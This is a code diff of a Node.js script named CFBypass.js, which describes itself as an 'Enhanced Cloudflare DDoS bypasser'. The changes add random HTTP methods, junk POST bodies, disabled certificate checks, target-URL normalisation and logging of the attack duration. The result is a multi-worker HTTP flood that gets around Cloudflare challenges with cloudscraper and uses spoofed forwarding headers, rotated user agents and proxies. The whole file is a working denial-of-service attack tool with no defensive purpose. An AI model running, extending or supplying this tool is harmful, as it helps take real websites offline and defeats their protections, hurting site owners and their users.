@@ -1,72 +1,93 @@
 const cloudscraper = require('cloudscraper');
-const https = require('https');
-const http = require('http');
+const request = require('request');
 const randomstring = require("randomstring");
 const fs = require('fs');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const cluster = require('cluster');
 const os = require('os');
+const urlParser = require('url');
 const tls = require('tls');
-const url = require('url');
 
-// Enhanced Configuration
-const CONCURRENCY = os.cpus().length * 100; // Increased worker multiplier
-const REQUEST_RATE_LIMIT = 1500; // Higher request rate
-const MAX_RETRIES = 5; // More retry attempts
-const SOCKET_TIMEOUT = 15000; // Longer timeout for HTTPS
+// Configuration
+const CONCURRENCY = os.cpus().length * 150; // Adjust based on your system
+const REQUEST_RATE_LIMIT = 2000; // Max requests per second (per worker)
+const MAX_RETRIES = 3;
 
+// HTTP Methods
+const Methods = [
+    "GET", 
+    "HEAD", 
+    "POST", 
+    "PUT", 
+    "DELETE", 
+    "CONNECT", 
+    "OPTIONS", 
+    "TRACE", 
+    "PATCH", 
+    "PURGE", 
+    "LINK", 
+    "UNLINK"
+];
+
+// Enhanced HTTP Status Codes
 const httpStatusCodes = {
+    // 2xx Success
     OK: 200,
+    CREATED: 201,
+    ACCEPTED: 202,
+    NO_CONTENT: 204,
+    PARTIAL_CONTENT: 206,
+    
+    // 3xx Redirection
+    MOVED_PERMANENTLY: 301,
+    FOUND: 302,
+    SEE_OTHER: 303,
+    NOT_MODIFIED: 304,
+    TEMPORARY_REDIRECT: 307,
+    PERMANENT_REDIRECT: 308,
+    
+    // 4xx Client Errors
     BAD_REQUEST: 400,
+    UNAUTHORIZED: 401,
+    FORBIDDEN: 403,
     NOT_FOUND: 404,
-    INTERNAL_SERVER: 500
+    METHOD_NOT_ALLOWED: 405,
+    NOT_ACCEPTABLE: 406,
+    REQUEST_TIMEOUT: 408,
+    CONFLICT: 409,
+    GONE: 410,
+    PAYLOAD_TOO_LARGE: 413,
+    URI_TOO_LONG: 414,
+    UNSUPPORTED_MEDIA_TYPE: 415,
+    TOO_MANY_REQUESTS: 429,
+    
+    // 5xx Server Errors
+    INTERNAL_SERVER_ERROR: 500,
+    NOT_IMPLEMENTED: 501,
+    BAD_GATEWAY: 502,
+    SERVICE_UNAVAILABLE: 503,
+    GATEWAY_TIMEOUT: 504,
+    HTTP_VERSION_NOT_SUPPORTED: 505,
+    NETWORK_AUTHENTICATION_REQUIRED: 511
 };
 
 const userAgents = [
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; Android 9; BLA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 4.3; GT-I9300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
-'Mozilla/5.0 (Android 8.0.0; SM-C7000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3317.0 YaaniBrowser/4.3.0.153 (Turkcell-TR) Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 6.0; LG-X240) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710FQ Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 7.0; F3211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 9; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; Android 6.0; LG-K350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; Android 8.0.0; SM-C5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36'
-
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+    'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 9; BLA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 4.3; GT-I9300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36'
 ];
 
 const referers = [
@@ -81,7 +102,6 @@ const referers = [
     "https://www.facebook.com/",
     "https://www.youtube.com/",
     "https://www.fbi.com/"
-
 ];
 
 const paths = [
@@ -92,7 +112,14 @@ const paths = [
     "/search",
     "/api/v1/test",
     "/wp-admin",
-    "/admin"
+    "/admin",
+    "/login",
+    "/register",
+    "/contact",
+    "/about",
+    "/products",
+    "/services",
+    "/blog"
 ];
 
 const tlsVersions = [
@@ -110,28 +137,44 @@ const ALPNProtocols = [
     'http/2', 
     'http/2+quic/43', 
     'http/2+quic/44',
-    'h3',                          // HTTP/3 standard
-    'h3-29',                       // Draft 29
-    'h3-28',                       // Draft 28
-    'h3-27',                       // Draft 27
-    'h3-T051',                     // Temporary Google variant
-    'h3-Q050',                     // QUIC draft 50
-    'h3-Q046',                     // QUIC draft 46
-    'h3-Q043',                     // QUIC draft 43
-    'quic',                        // Generic QUIC
-    'hq',                          // HTTP/0.9 over QUIC
-    'doq',                         // DNS over QUIC
-    'doq-h3',                      // DNS over HTTP/3
-    'h3-fb',                       // Facebook variant
-    'h3-uber',                     // Uber variant
-    'h3-23',                       // Draft 23
-    'h3-25'                        // Draft 25
+    'h3',
+    'h3-29',
+    'h3-28',
+    'h3-27',
+    'h3-T051',
+    'h3-Q050',
+    'h3-Q046',
+    'h3-Q043',
+    'quic',
+    'hq',
+    'doq',
+    'doq-h3',
+    'h3-fb',
+    'h3-uber',
+    'h3-23',
+    'h3-25'
 ];
 
 let proxies = [];
 let currentProxyIndex = 0;
 let requestCount = 0;
 let lastResetTime = Date.now();
+
+function createSecureContext() {
+    return tls.createSecureContext({
+        minVersion: 'TLSv1.1',
+        maxVersion: 'TLSv1.3',
+        ciphers: [
+            'TLS_AES_256_GCM_SHA384',
+            'TLS_CHACHA20_POLY1305_SHA256',
+            'TLS_AES_128_GCM_SHA256',
+            'ECDHE-RSA-AES256-GCM-SHA384',
+            'ECDHE-RSA-AES128-GCM-SHA256'
+        ].join(':'),
+        honorCipherOrder: true,
+        ALPNProtocols: ALPNProtocols
+    });
+}
 
 function checkRateLimit() {
     const now = Date.now();
@@ -176,6 +219,10 @@ function getRandomTLSVersion() {
     return tlsVersions[Math.floor(Math.random() * tlsVersions.length)];
 }
 
+function getRandomMethod() {
+    return Methods[Math.floor(Math.random() * Methods.length)];
+}
+
 function loadProxies() {
     try {
         console.log("[+] Loading proxies from proxy.txt...");
@@ -202,6 +249,23 @@ function getNextProxy() {
     return proxies[currentProxyIndex];
 }
 
+function normalizeTargetUrl(url) {
+    // Add http:// if no protocol is specified
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        url = 'http://' + url;
+    }
+    
+    // Parse the URL to ensure it's valid
+    const parsed = urlParser.parse(url);
+    if (!parsed.hostname) {
+        console.log('[!] Invalid URL format');
+        process.exit(1);
+    }
+    
+    // Remove any path from the base URL
+    return `${parsed.protocol}//${parsed.hostname}`;
+}
+
 function createRequestOptions(url, path, cookie, useragent, referer) {
     const ip = generateFakeIP();
     const rand = randomstring.generate({
@@ -209,8 +273,12 @@ function createRequestOptions(url, path, cookie, useragent, referer) {
         charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
     });
     
+    const method = getRandomMethod();
+    const isPost = method === 'POST';
+    
     const options = {
         url: url + path,
+        method: method,
         headers: {
             'User-Agent': useragent,
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -240,8 +308,19 @@ function createRequestOptions(url, path, cookie, useragent, referer) {
         ALPNProtocols: ALPNProtocols,
         followRedirect: true,
         followAllRedirects: true,
-        maxRedirects: 5
+        maxRedirects: 5,
+        rejectUnauthorized: false, // Bypass SSL verification
+        secureContext: createSecureContext() // Custom secure context
     };
+    
+    // Add random POST data if method is POST
+    if (isPost) {
+        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+        options.body = randomstring.generate({
+            length: 100,
+            charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+        });
+    }
     
     const proxyUrl = getNextProxy();
     if (proxyUrl) {
@@ -255,120 +334,7 @@ function createRequestOptions(url, path, cookie, useragent, referer) {
     return options;
 }
 
-function createSecureContext() {
-    return tls.createSecureContext({
-        minVersion: 'TLSv1.1',
-        maxVersion: 'TLSv1.3',
-        ciphers: [
-            'TLS_AES_256_GCM_SHA384',
-            'TLS_CHACHA20_POLY1305_SHA256',
-            'TLS_AES_128_GCM_SHA256',
-            'ECDHE-RSA-AES256-GCM-SHA384',
-            'ECDHE-RSA-AES128-GCM-SHA256'
-        ].join(':'),
-        honorCipherOrder: true,
-        ALPNProtocols: ALPNProtocols
-    });
-}
-
-function createHttpAgent(targetUrl) {
-    const parsed = new URL(targetUrl);
-    const isHttps = parsed.protocol === 'https:';
-    
-    const agentOptions = {
-        keepAlive: true,
-        maxSockets: 50,
-        timeout: SOCKET_TIMEOUT,
-        rejectUnauthorized: false // Bypass SSL verification
-    };
-    
-    if (isHttps) {
-        agentOptions.secureContext = createSecureContext();
-        return new https.Agent(agentOptions);
-    }
-    return new http.Agent(agentOptions);
-}
-
-function createRequestOptions(targetUrl, path, cookie, useragent, referer) {
-    const ip = generateFakeIP();
-    const rand = randomstring.generate(10);
-    const parsedUrl = new URL(targetUrl);
-    const isHttps = parsedUrl.protocol === 'https:';
-    
-    const options = {
-        hostname: parsedUrl.hostname,
-        port: parsedUrl.port || (isHttps ? 443 : 80),
-        path: path || parsedUrl.pathname,
-        method: 'GET',
-        headers: {
-            'Host': parsedUrl.hostname,
-            'User-Agent': useragent,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Pragma': 'no-cache',
-            'Referer': referer,
-            'X-Forwarded-For': ip,
-            'X-Real-IP': ip,
-            'Cookie': cookie,
-            'Upgrade-Insecure-Requests': '1'
-        },
-        agent: createHttpAgent(targetUrl),
-        timeout: SOCKET_TIMEOUT
-    };
-    
-    // Add proxy support
-    const proxyUrl = getNextProxy();
-    if (proxyUrl) {
-        if (proxyUrl.startsWith('socks')) {
-            options.agent = new SocksProxyAgent(proxyUrl, {
-                timeout: SOCKET_TIMEOUT,
-                secureContext: isHttps ? createSecureContext() : undefined
-            });
-        } else {
-            options.proxy = proxyUrl;
-        }
-    }
-    
-    return options;
-}
-
-function executeRequest(targetUrl, options) {
-    return new Promise((resolve) => {
-        const parsed = new URL(targetUrl);
-        const isHttps = parsed.protocol === 'https:';
-        const module = isHttps ? https : http;
-        
-        const req = module.request(options, (res) => {
-            let data = '';
-            res.on('data', (chunk) => data += chunk);
-            res.on('end', () => {
-                resolve({
-                    statusCode: res.statusCode,
-                    headers: res.headers,
-                    body: data
-                });
-            });
-        });
-        
-        req.on('error', (e) => {
-            console.log(`[!] Request error: ${e.message}`);
-            resolve(null);
-        });
-        
-        req.on('timeout', () => {
-            req.destroy();
-            console.log('[!] Request timeout');
-            resolve(null);
-        });
-        
-        req.end();
-    });
-}
-
-async function makeRequest(targetUrl, time) {
+async function makeRequest(url, time) {
     if (!checkRateLimit()) {
         await new Promise(resolve => setTimeout(resolve, 100));
         return;
@@ -381,39 +347,52 @@ async function makeRequest(targetUrl, time) {
     
     while (retries < MAX_RETRIES) {
         try {
-            // First bypass Cloudflare if needed
-            const cloudflareOptions = createRequestOptions(targetUrl, path, '', useragent, referer);
-            delete cloudflareOptions.headers.Cookie;
+            const cloudflareOptions = createRequestOptions(url, path, '', useragent, referer);
+            delete cloudflareOptions.headers.cookie;
             
-            const cfResponse = await executeRequest(targetUrl, cloudflareOptions);
-            const cookie = cfResponse?.headers['set-cookie'] || '';
+            const response = await cloudscraper.get(cloudflareOptions);
+            const cookie = response.request.headers.cookie || '';
             
-            // Then make the actual request
-            const options = createRequestOptions(targetUrl, path, cookie, useragent, referer);
-            const response = await executeRequest(targetUrl, options);
+            const options = createRequestOptions(url, path, cookie, useragent, referer);
+            request(options, (error, response) => {
+                if (!error && response) {
+                    const statusCode = response.statusCode;
+                    let statusMessage = 'Unknown';
+                    
+                    // Match status code with our enhanced list
+                    for (const [key, value] of Object.entries(httpStatusCodes)) {
+                        if (value === statusCode) {
+                            statusMessage = key;
+                            break;
+                        }
+                    }
+                    
+                    console.log(`[+] ${options.method} Request sent to ${options.url} - Status: ${statusCode} (${statusMessage}) - IP: ${options.headers['X-Forwarded-For']}${options.proxy || options.agent ? ' via proxy' : ''}`);
+                } else if (error && retries === MAX_RETRIES - 1) {
+                    console.log(`[!] Request error: ${error.message}`);
+                }
+            });
             
-            if (response) {
-                console.log(`[+] ${targetUrl} - Status: ${response.statusCode} - IP: ${options.headers['X-Forwarded-For']}`);
-            }
             break;
         } catch (error) {
             retries++;
             if (retries === MAX_RETRIES) {
-                console.log(`[!] Max retries reached for ${targetUrl}: ${error.message}`);
+                console.log(`[!] Max retries reached for request: ${error.message}`);
             }
         }
     }
 }
 
 if (process.argv.length <= 2) {
-    console.log("\nEnhanced Cloudflare DDoS bypasser with proxy support\n");
+    console.log("\nEnhanced Cloudflare DDoS bypasser with HTTP/HTTPS and proxy support\n");
     console.log("Usage: node CFBypass.js <url> <time> [proxy]");
-    console.log("Example: node CFBypass.js https://example.com 60");
+    console.log("Example: node CFBypass.js example.com 60");
+    console.log("Example: node CFBypass.js https://example.com 60 proxy");
     console.log("Optional: Add 'proxy' argument to enable proxy rotation from proxy.txt");
     process.exit(-1);
 }
 
-const targetUrl = process.argv[2];
+const targetUrl = normalizeTargetUrl(process.argv[2]);
 const attackTime = parseInt(process.argv[3]) || 60;
 const useProxies = process.argv[4] === 'proxy';
 
@@ -422,7 +401,11 @@ if (useProxies) {
 }
 
 if (cluster.isMaster) {
+    console.log(`Target URL: ${targetUrl}`);
+    console.log(`Attack duration: ${attackTime} seconds`);
+    console.log(`Proxy support: ${useProxies ? 'Enabled' : 'Disabled'}`);
     console.log(`Launching ${CONCURRENCY} workers...`);
+    
     // Enable load balancing
     cluster.schedulingPolicy = cluster.SCHED_RR;
     for (let i = 0; i < CONCURRENCY; i++) {
